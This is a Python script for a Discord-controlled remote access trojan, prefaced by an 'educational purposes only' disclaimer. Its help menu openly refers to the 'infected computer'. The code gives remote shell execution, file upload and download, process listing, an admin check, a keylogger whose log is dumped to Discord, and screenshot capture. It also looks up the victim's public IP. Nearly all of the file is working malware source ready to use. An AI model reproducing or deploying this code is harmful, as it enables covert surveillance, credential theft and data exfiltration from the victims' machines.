"""
DISCLAIMER: 
This script is for educational and ethical purposes only. 

The author will not be held responsible for any misuse of this script for any 
illegal, unauthorized, or malicious activities.

This script is not intended for distribution, and by using this script, you agree 
to take full responsibility for its use and ensure compliance with all applicable laws.

"""

import os
import subprocess
import discord
from requests import get
import platform
import ctypes
from mss import mss
from pynput.keyboard import Listener
import logging

# Bot token (hardcoded)
token = "YOUR TOKEN_HERE"

# Initialize Discord client and bot
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
bot = discord.Client(intents=intents)

helpmenu = """
Available commands are:

--> !help = This menu
--> !sysinfo = Info about the infected computer
--> !exec = Execute a shell command
--> !current = Display the current dir
--> !files = Display all items in current dir
--> !cd = Change the directory
--> !listprocess = Get all process
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer
--> !admincheck = Check if program has admin privileges
--> !startkeylogger = Starts a keylogger
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !screenshot = Get a screenshot of the user's current screen
--> !closebot = Closes the bot on the infected computer until next startup

"""

@bot.event
async def on_ready():
    print(f'Bot connected as {bot.user}')

@bot.event
async def on_message(message):
    # Ignore messages from bots
    if message.author.bot:
        return

    # Help menu
    elif message.content == "!help":
        temp = (os.getenv('TEMP'))
        f5 = open(temp + r"\helpmenu.txt", 'a')
        f5.write(str(helpmenu))
        f5.close()
        file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
        await message.channel.send("[*] Command successfully executed", file=file)
        os.remove(temp + r"\helpmenu.txt")

    # List system info
    elif message.content == "!sysinfo":
        jak = str(platform.uname())
        intro = jak[12:]
        ip = get('https://api.ipify.org').text
        pp = "IP Address = " + ip
        await message.channel.send("[*] Command successfully executed : " + intro + pp)    

    # Shell command execution
    elif message.content.startswith("!exec"):
        command = message.content[len("!exec "):].strip()
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            await message.channel.send(f"```{output}```")
        except Exception as e:
            await message.channel.send(f"Error: {str(e)}")

    # List current directory
    elif message.content == "!current":
        try:
            current_dir = os.getcwd()
            await message.channel.send(f"Current directory:\n```\n{current_dir}\n```")
        except Exception as e:
            await message.channel.send(f"Error retrieving current directory: {e}")

    # List files in current directory
    elif message.content == "!files":
        files = os.listdir(".")
        await message.channel.send(f"Files in current directory: {', '.join(files)}")

    # Change directory    
    elif message.content.startswith("!cd"):
        os.chdir(message.content[4:])
        await message.channel.send("[*] Command successfully executed")

    # List all processes
    if message.content == "!listprocess":
            if 1==1:
                result = subprocess.getoutput("tasklist")
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output.txt"):
                        os.system(r"del %temp%\output.txt /f")
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)

    # Download file
    elif message.content.startswith("!download"):
        filename = message.content[10:].strip()
        if os.path.exists(filename):
            try:
                file_size = os.path.getsize(filename)
                if file_size > 7340032:  # File size limit (8 MB)
                    await message.channel.send("File size exceeds 8 MB. Use another method to transfer.")
                else:
                    await message.channel.send("Uploading file...", file=discord.File(filename))
            except Exception as e:
                await message.channel.send(f"Error uploading file: {e}")
        else:
            await message.channel.send("File not found.")

    # Upload file
    elif message.content.startswith("!upload"):
        await message.attachments[0].save(message.content[8:])
        await message.channel.send("[*] Command successfully executed")

    # Check if bot is admin
    elif message.content == "!admincheck":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            await message.channel.send("[*] Congrats you're admin")
        else:
            await message.channel.send("[!] Sorry, you're not admin")

    # Start keylogging
    elif message.content == "!startkeylogger":
        temp = os.getenv("TEMP")
        log_dir = temp
        logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def keylog():
            def on_press(key):
                logging.info(str(key))
            with Listener(on_press=on_press) as listener:
                listener.join()
        import threading
        global test
        test = threading.Thread(target=keylog)
        test._running = True
        test.daemon = True
        test.start()
        await message.channel.send("[*] Keylogger successfuly started")

    # Stop keylogging
    elif message.content == "!stopkeylogger":
        test._running = False
        await message.channel.send("[*] Keylogger successfuly stopped")

    # Dump keylog
    elif message.content == "!dumpkeylogger":
        temp = os.getenv("TEMP")
        file_keys = temp + r"\key_log.txt"
        file = discord.File(file_keys, filename="key_log.txt")
        await message.channel.send("[*] Command successfuly executed", file=file)
        os.remove(file_keys)

    # Take a screenshot
    elif message.content == "!screenshot":
        with mss() as sct:
            sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
        path = (os.getenv('TEMP')) + r"\monitor.png"
        file = discord.File((path), filename="monitor.png")
        await message.channel.send("[*] Command successfuly executed", file=file)
        os.remove(path)

    # Close the bot session
    elif message.content == "!closebot":
        await message.channel.send("Bot shutting down.")
        await bot.close()

# Run the bot
if __name__ == "__main__":
    bot.run(token)
